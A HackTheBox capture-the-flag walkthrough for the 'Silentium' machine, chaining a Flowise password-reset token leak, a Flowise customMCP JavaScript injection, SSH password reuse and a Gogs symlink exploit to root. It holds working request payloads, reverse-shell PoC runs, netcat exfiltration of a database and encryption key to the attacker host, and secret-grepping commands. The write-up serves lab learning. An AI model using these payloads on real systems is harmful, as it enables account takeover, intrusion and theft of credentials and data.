---
title: "HTB - Silentium"
date: 2026-04-14
tags: ["HackTheBox","Linux","Medium"]
categories: ["Machines&Challenges"]
difficulty: "Medium"
os: "Linux"
author: "z3r0s"
featuredImage: "/logos/Silentium.png"
---
---

## 1. Port Scan

```bash
nmap -sV -A -T4 10.129.30.114 -o port_scan
```

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-14 15:20 -0400
Nmap scan report for 10.129.30.114
Host is up (0.088s latency).
Not shown: 998 closed tcp ports (reset)

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/

OS details: Linux 5.0 - 5.14
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Only **SSH (22)** and **HTTP (80)** are exposed. Add `silentium.htb` to `/etc/hosts`.

---

## 2. Web Enumeration

### 2.1 Subdomain Fuzzing

```bash
ffuf -c -u http://silentium.htb/ \
  -H "Host: FUZZ.silentium.htb" \
  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  --fs 178
```

```
[Status: 200, Size: 3142, Words: 789, Lines: 70]
* FUZZ: staging
```

Found: `staging.silentium.htb` → **Flowise** login panel.

Manually found `/register` endpoint on the staging subdomain.

---

### 2.2 API Fuzzing

```bash
ffuf -c -u http://staging.silentium.htb/FUZZ \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  --fs 3142
```

```
api/v1/account/accounts       [Status: 401]
api/v1/account/summaries      [Status: 401]
api/v1/account/auth/ticket    [Status: 401]
api/v1/account/auth/token     [Status: 401]
api/v1/account/permissions    [Status: 401]
api/v1/account/user           [Status: 401]
api/v1/account/assets         [Status: 401]
api/v1/account/userAccountAssignments [Status: 401]
api/v1/account/user/delete    [Status: 401]
api/v1/account/userPreferences [Status: 401]
api/v1/account/user/profile   [Status: 401]
api/v1/account/user/register  [Status: 401]
api/v1/account/user/resend-verification [Status: 401]
api/v1/account/users/password [Status: 401]
api/v1/account/users/summaries [Status: 401]
api/v1/account/verify         [Status: 401]
api/v1/analytics/events       [Status: 401]
api/v1/articles/json          [Status: 401]
api/v1/asset/assets           [Status: 401]
api/v1/asset/asset            [Status: 401]
api/v1/auth                   [Status: 401]
```

Identified key endpoint: `api/v1/account/user/register`

---

### 2.3 Registration Attempt (Frontend Bypass)

The `/register` page frontend didn't work directly. Identified `/api/v1/login` via browser Network tab. Tried registering via curl:

```bash
curl -X POST "http://staging.silentium.htb/api/v1/auth/register" \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -H "Origin: http://staging.silentium.htb" \
  -H "Referer: http://staging.silentium.htb/signup" \
  -d '{
    "fullName": "Mario Rossi",
    "email": "velid@velid.com",
    "password": "Password1!",
    "confirmPassword": "Password1!"
  }'
```

```json
{"message":"Invalid or Missing token"}
```

Retried with the correct endpoint:

```bash
curl -X POST "http://staging.silentium.htb/api/v1/register" \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -d '{
    "fullName": "Mario Rossi",
    "email": "velid@velid.com",
    "password": "Password1!",
    "confirmPassword": "Password1!"
  }'
```

```json
{"message":"Invalid or Missing token"}
```

Still failing - registration blocked. Pivot to **password reset** flow.

---

## 3. Foothold – CVE-2025-58434 (Flowise Account Takeover)

From `silentium.htb` **Leadership** page, user `ben@silentium.htb` was identified as the Flowise admin.

### 3.1 Leak tempToken via forgot-password

```bash
curl -X POST "http://staging.silentium.htb/api/v1/account/forgot-password" \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/plain, */*" \
  -d '{
    "user": {
      "email": "ben@silentium.htb"
    }
  }'
```

```
HTTP/1.1 201 Created
Content-Type: application/json; charset=utf-8
Content-Length: 579
```

```json
{
  "user": {
    "id": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
    "name": "admin",
    "email": "ben@silentium.htb",
    "credential": "$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG",
    "tempToken": "7W1Z6KxQMvDEqgjmQge7KQ4uBp2IP3G7ARlFbk77SHRFmu4EnrQoTWzw1zT7W4ue",
    "tokenExpiry": "2026-04-14T20:32:46.172Z",
    "status": "active",
    "createdDate": "2026-01-29T20:14:57.000Z",
    "updatedDate": "2026-04-14T20:17:46.000Z",
    "createdBy": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
    "updatedBy": "e26c9d6c-678c-4c10-9e36-01813e8fea73"
  },
  "organization": {},
  "organizationUser": {},
  "workspace": {},
  "workspaceUser": {},
  "role": {}
}
```

> The `tempToken` is leaked directly in the HTTP response - this is the CVE-2025-58434 vulnerability.

---

### 3.2 Reset Password Using Leaked Token

```bash
curl -X POST "http://staging.silentium.htb/api/v1/account/reset-password" \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/plain, */*" \
  -d '{
    "user": {
      "email": "ben@silentium.htb",
      "tempToken": "U78muxSEJ7hTGQX72Mlxfa2fCIWAtl6ESwzJeAgVQ71gP4r2lVI8TmoByx8nbQAw",
      "password": "MyPassword123"
    }
  }'
```

Password reset successful. Now login as `ben@silentium.htb:MyPassword123`.

---

## 4. RCE – CVE-2025-59528 (Flowise CustomMCP Node Injection)

After logging in to Flowise, the app is vulnerable to **CVE-2025-59528** - JavaScript code execution via the `customMCP` node `listActions` method.

### 4.1 Get JWT Token

Intercept the login response from:

```
POST /api/v1/auth/login HTTP/1.1
Host: staging.silentium.htb

{"email":"ben@silentium.htb","password":"MyPassword123"}
```

Copy the `token` cookie / Bearer JWT from the response headers.

---

### 4.2 Trigger RCE via customMCP

```bash
curl -X POST "http://staging.silentium.htb/api/v1/node-load-method/customMCP" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <JWT_TOKEN>" \
  -H "x-request-from: internal" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"curl 10.10.14.184:8000\");return 1;})()})"
    }
  }'
```

Callback received on `10.10.14.184:8000` - RCE confirmed.

---

### 4.3 Reverse Shell via PoC Script

```bash
python3 exploit.py \
  -t http://staging.silentium.htb \
  --mode revshell \
  --lhost 10.10.15.154 \
  --lport 9091 \
  --email "ben@silentium.htb" \
  --password "MyPassword123"
```

```
[*] Target: http://staging.silentium.htb
[*] Mode:   revshell
[+] Auth: JWT login (ben@silentium.htb)
[+] Authentication successful
[*] Auto mode – trying bash, nc, and python reverse shells
[*] Sending bash reverse shell → 10.10.15.154:9091   Delivered (HTTP 200)
[*] Sending nc reverse shell   → 10.10.15.154:9091   Delivered (HTTP 200)
[*] Sending python reverse shell → 10.10.15.154:9091
[+] All payloads sent. Check your listener!
```

Listener catches the shell:

```
nc -lnvp 9091

Ncat: Listening on 0.0.0.0:9091
Ncat: Connection from 10.129.42.27:35193.
/bin/sh: can't access tty; job control turned off
/ # whoami
root
/ # ip a
...
2: eth0@if13: inet 172.17.0.3/16   ← Docker container
```

> We are **root inside the Flowise Docker container**, not the host.

---

## 5. Container Enumeration & Credential Extraction

```bash
cd ~/.flowise
ls -la
```

```
drwxr-xr-x  3 root root   4096 Apr 28 15:39 .
drwx------  1 root root   4096 Apr  8 09:41 ..
-rw-r--r--  1 root root 385024 Apr 28 15:39 database.sqlite
-rw-r--r--  1 root root     32 Jan 29 20:08 encryption.key
drwxr-xr-x  2 root root   4096 Apr  8 09:41 uploads
```

Exfiltrate the database and key:

```bash
# On container:
nc -w 3 10.10.15.154 9092 < database.sqlite
nc -w 3 10.10.15.154 9092 < encryption.key
```

```bash
# On attacker:
nc -lvnp 9092 > database.sqlite
nc -lvnp 9092 > encryption.key
```

Inspect environment variables:

```bash
strings /proc/$(pgrep -f flowise)/environ 2>/dev/null | grep -i "secret\|key\|pass"
env | grep -i flowise
printenv
```

```
FLOWISE_PASSWORD=F1l3_d0ck3r
FLOWISE_USERNAME=ben
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
SECRETKEY_PATH=/root/.flowise
DATABASE_PATH=/root/.flowise
SMTP_PASSWORD=r04D!!_R4ge
JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
SMTP_HOST=mailhog
```

---

## 6. User Flag – SSH via Password Reuse

The `SMTP_PASSWORD` reused on the host account:

```bash
ssh ben@silentium.htb
# password: r04D!!_R4ge
```

```
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)
Last login: Wed Apr  8 19:12:55 2026 from 10.10.14.5

ben@silentium:~$ ls
user.txt

ben@silentium:~$ cat user.txt
a******************************4
```

---

## 7. Local Enumeration

```bash
ben@silentium:~$ netstat -tulnp
```

```
Proto Recv-Q Send-Q Local Address      Foreign Address   State    PID/Program
tcp        0      0 127.0.0.54:53      0.0.0.0:*         LISTEN   -
tcp        0      0 127.0.0.1:3001     0.0.0.0:*         LISTEN   -
tcp        0      0 127.0.0.1:3000     0.0.0.0:*         LISTEN   -
tcp        0      0 127.0.0.1:1025     0.0.0.0:*         LISTEN   -
tcp        0      0 0.0.0.0:80         0.0.0.0:*         LISTEN   -
tcp        0      0 0.0.0.0:22         0.0.0.0:*         LISTEN   -
tcp        0      0 127.0.0.1:42263    0.0.0.0:*         LISTEN   -
tcp        0      0 127.0.0.1:8025     0.0.0.0:*         LISTEN   -
tcp        0      0 127.0.0.53:53      0.0.0.0:*         LISTEN   -
tcp6       0      0 :::80              :::*               LISTEN   -
tcp6       0      0 :::22              :::*               LISTEN   -
```

Internal services:

- `3000` → Flowise
- `3001` → **Gogs** (self-hosted Git)
- `8025` → MailHog (SMTP web UI)

---

### 7.1 Forward Internal Ports

```bash
# Forward MailHog (8025) to local port 3000:
ssh -L 3000:localhost:8025 ben@silentium.htb

# Forward Gogs (3001) to local port 3001:
ssh -L 3001:localhost:3001 ben@silentium.htb
```

Browse to `http://localhost:3001` → **Gogs v0.13.3** running as `root`.

Also found a new subdomain: `staging-v2-code.dev.silentium.htb` pointing to Gogs.

---

## 8. Root – CVE-2025-8110 (Gogs Symlink RCE)

### 8.1 Register on Gogs (via Web UI with captcha)

Manually register user `vel / vel@vel.vel` at `http://localhost:3001/user/sign_up`.

Set git identity before running the exploit:

```bash
git config --global user.email "vel@vel.vel"
git config --global user.name "vel"
```

---

### 8.2 Run the PoC

```bash
python3 CVE-2025-8110.py \
  -u http://staging-v2-code.dev.silentium.htb \
  -lh 10.10.15.154 \
  -lp 9091
```

```
[+] Authenticated successfully
Token generation status: 200
[+] Application token: 6fc8a011e3560cf16e82f7bc2d48e1729c8fde6a
New creation status: 201
Cloning into '/tmp/3e193b249ba0'...
remote: Enumerating objects: 3, done.
remote: Counting objects: 100% (3/3), done.
remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
Unpacking objects: 100% (3/3), 243 bytes | 243.00 KiB/s, done.
[master 1486b7d] Add malicious symlink
 1 file changed, 1 insertion(+)
 create mode 120000 malicious_link
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 4 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 289 bytes | 289.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
To http://staging-v2-code.dev.silentium.htb/vel/3e193b249ba0.git
   99cF789..1486b7d  master -> master
[+] Exploit sent, check your listener!
```

---

### 8.3 Catch Root Shell

```bash
nc -lnvp 9091
```

```
Ncat: Listening on 0.0.0.0:9091
Ncat: Connection from 10.129.43.86.
Ncat: Connection from 10.129.43.86:59072.
bash: cannot set terminal process group (1530): Inappropriate ioctl for device
bash: no job control in this shell

root@silentium:/opt/gogs/gogs/data/tmp/local-repo/5# whoami
root

root@silentium:/opt/gogs/gogs/data/tmp/local-repo/5# cat /root/root.txt
```

**Rooted.**

---

## Summary

|Step|Technique|CVE|
|---|---|---|
|Flowise account takeover|`tempToken` leaked in HTTP response|CVE-2025-58434|
|RCE in Docker container|`Function()` eval in CustomMCP node|CVE-2025-59528|
|Credential reuse|`SMTP_PASSWORD` → SSH as `ben`|-|
|Root on host|Symlink traversal via Gogs `PutContents` API|CVE-2025-8110|